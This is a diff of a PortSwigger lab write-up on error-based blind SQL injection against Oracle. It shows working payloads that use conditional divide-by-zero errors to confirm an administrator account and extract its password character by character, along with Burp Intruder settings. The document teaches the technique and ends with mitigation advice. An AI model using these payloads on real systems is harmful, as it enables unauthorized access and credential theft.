@@ -59,7 +59,7 @@ HTTP/2 500 Internal Server Error
 ```
 HTTP/2 200 OK
 
-The strongly indicated the target is using an Oracle database. Oracle requires a `FROM` clause even for selecting constant values. `DUAL` is a special one-row dummy table that Oracle provides for such cases.
+This strongly indicates the target is using an Oracle database. Oracle requires a `FROM` clause even for selecting constant values. `DUAL` is a special one-row dummy table that Oracle provides for such cases.
 
 **The Tracking ID becomes:**
 ```http
@@ -78,12 +78,12 @@ HTTP/2 200 OK
 Check conditional statement:
 
 ```sql
-'||(SELECT CASE WHEN'1'='1' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
+'||(SELECT CASE WHEN '1'='1' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
 ```
 HTTP/2 500 Internal Server Error
 
 ```sql
-'||(SELECT CASE WHEN'1'='2' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
+'||(SELECT CASE WHEN '1'='2' THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
 ```
 HTTP/2 200 OK
 
@@ -92,21 +92,21 @@ In the first payload, `TO_CHAR(1/0)` forces evaluation and triggers a division-b
 ### 4. Verified the `administrator` Username
 
 ```sql
-'||(SELECT CASE WHEN'1'='1' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN '1'='1' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 HTTP/2 500 Internal Server Error
 
 ```sql
-'||(SELECT CASE WHEN'1'='2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN '1'='2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 HTTP/2 200 OK
 
 A 500 error when the condition is true confirms that a user with the username 'administrator' exists. A 200 response when the condition is false confirms the query is evaluated correctly.
 
-Explanation:
+**Explanation:**
 `SELECT ... FROM users WHERE username='administrator'`
 This part is executed first: it filters the `users` table down to just rows where `username = 'administrator'`.
-- If no such row exists, the query returns nothing, and the rest doesn’t matter.
+- If no such row exists, the query returns nothing, and the rest doesn't matter.
 - If the user does exist, Oracle moves on to evaluate the `CASE` for that row.
 
 `CASE WHEN '1'='1' THEN TO_CHAR(1/0) ELSE '' END`
@@ -133,9 +133,11 @@ Response: HTTP/2 200 OK
 
 This response confirms that the password is exactly 20 characters long.
 
-### 6. Retrieved the Password Using Intruder (Sniper Attack)
+### 6. Retrieved the Password Using Intruder
 
+```sql
 '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
 
 In Burp Intruder, select `a` and click the **Add §** button:
 
@@ -159,11 +161,23 @@ Repeated the process for all 20 characters and successfully retrieved the comple
 
 Logged in as the administrator using the retrieved password.
 
+Alternatively, `Cluster bomb attack` can be used to retrieve all characters at once:
+
+```sql
+'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+Payload for `1`: 1-20
+
+Payload for `a`: a-z and 0-9
+
+Filter only `5xx [server error]` responses.
+
 ---
 
 ## Mitigation
 
-- Use parameterised queries (prepped statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
+- Use parameterized queries (prepared statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
 
 Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/09-blind-sqli-conditional-responses.md#mitigation)
 
@@ -179,13 +193,13 @@ Learned how blind SQL injection can be used to extract data character-by-charact
 
 ## Notes
 
-`Oracle Syntax`: SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
-`Microsoft Syntax`: SELECT CASE WHEN (CONDITION) THEN 1/0 ELSE NULL END
+- **Oracle Syntax**: `SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
+- **Microsoft Syntax**: `SELECT CASE WHEN (CONDITION) THEN 1/0 ELSE NULL END`
 
 [Portswigger SQLi syntax](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 `||` in Oracle is the string concatenation operator. It forces the subquery to be evaluated as part of a string expression.
-Here in SQLi it forces Oracle to execute a subquery that normally wouldn’t be evaluated unless used in a larger expression.
+Here in SQLi it forces Oracle to execute a subquery that normally wouldn't be evaluated unless used in a larger expression.
 
 In this lab:
 ```sql
